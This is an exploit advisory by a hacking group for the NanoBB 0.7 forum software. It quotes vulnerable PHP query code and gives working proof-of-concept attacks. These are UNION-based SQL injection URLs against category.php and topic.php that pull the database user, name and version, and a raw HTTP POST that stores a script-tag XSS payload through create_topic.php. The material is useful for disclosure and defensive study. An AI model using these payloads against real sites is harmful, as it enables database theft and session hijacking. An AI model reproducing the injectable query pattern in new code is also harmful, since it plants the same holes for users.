@@ -1,0 +1,129 @@
+# Exploit Title   : NanoBB 0.7 Multiple Vulnerabilities
+# Date            : 10 June 2013
+# Exploit Author  : CWH Underground
+# Site            : www.2600.in.th
+# Vendor Homepage : http://nanobb.sourceforge.net/
+# Software Link   : heanet.dl.sourceforge.net/project/nanobb/v0.7.zip
+# Version         : 0.7
+# Tested on       : Window and Linux
+ 
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /         
+  / XXXXXX /
+ (________(           
+  `------'
+ 
+##############################################
+VULNERABILITY: SQL Injection (Category,Topic)
+##############################################
+ 
+/category.php (LINE: 7-16)
+ 
+-----------------------------------------------------------------------------
+LINE 7-16:
+
+$sql = "SELECT
+			cat_id,
+			cat_name,
+			cat_description
+		FROM
+			categories
+		WHERE
+			cat_id = " . mysql_real_escape_string($_GET['id']);
+
+$result = mysql_query($sql);
+-----------------------------------------------------------------------------
+
+
+/topic.php (LINE: 7-16)
+ 
+-----------------------------------------------------------------------------
+LINE 11-19:
+
+$sql = "SELECT
+			topic_id,
+			topic_subject
+		FROM
+			topics
+		WHERE
+			topics.topic_id = " . mysql_real_escape_string($_GET['id']);
+			
+$result = mysql_query($sql);
+-----------------------------------------------------------------------------
+     
+ 
+#####################################################
+DESCRIPTION FOR SQL INJECTION
+#####################################################
+ 
+An attacker might execute arbitrary SQL commands on the database server with this vulnerability. 
+User tainted data is used when creating the database query that will be executed on the database management system (DBMS). 
+An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system 
+depending on the query, DBMS and configuration.
+
+POC:
+
+http://target/nano/category.php?id=9%20and%201%20div%202%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%29,0x3a3a,version%28%29%29,3
+http://target/nano/topic.php?id=10%20and%201%20div%200%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%29,0x3a3a,version%28%29%29
+ 
+
+#####################################################
+VULNERABILITY: Cross Site Scripting (Create_topic.php)
+#####################################################
+ 
+/category.php (LINE: 106-119)
+ 
+-----------------------------------------------------------------------------
+LINE 106-119:
+
+$topicid = mysql_insert_id();
+				
+				$sql = "INSERT INTO
+							posts(post_content,
+								  post_date,
+								  post_topic,
+								  post_by)
+						VALUES
+							('" . mysql_real_escape_string($_POST['post_content']) . "',
+								  NOW(),
+								  " . $topicid . ",
+								  " . $_SESSION['user_id'] . "
+							)";
+				$result = mysql_query($sql);
+-----------------------------------------------------------------------------
+ 
+ 
+#####################################################
+DESCRIPTION FOR CROSS SITE SCRIPTING
+#####################################################
+ 
+An attacker might execute arbitrary HTML/JavaScript Code in the clients browser context with this security vulnerability. 
+User tainted data is embedded into the HTML output by the application and rendered by the users browser, thus allowing an attacker 
+to embed and render malicious code. Preparing a malicious link will lead to an execution of this malicious code in another users browser 
+context when clicking the link. This can lead to local website defacement, phishing or cookie stealing and session hijacking.
+
+POC:
+
+POST /nano/create_topic.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/nano/create_topic.php
+Cookie: __utma=111872281.1795322081.1369810583.1369810583.1369810583.1; __utmz=111872281.1369810583.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); lang=en_US; PHPSESSID=gbf1u3p49bid3b1g4cnhuplco5
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+topic_subject=Test+XSS&topic_cat=7&post_content=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E
+ 
+ 
+################################################################################################################
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+################################################################################################################
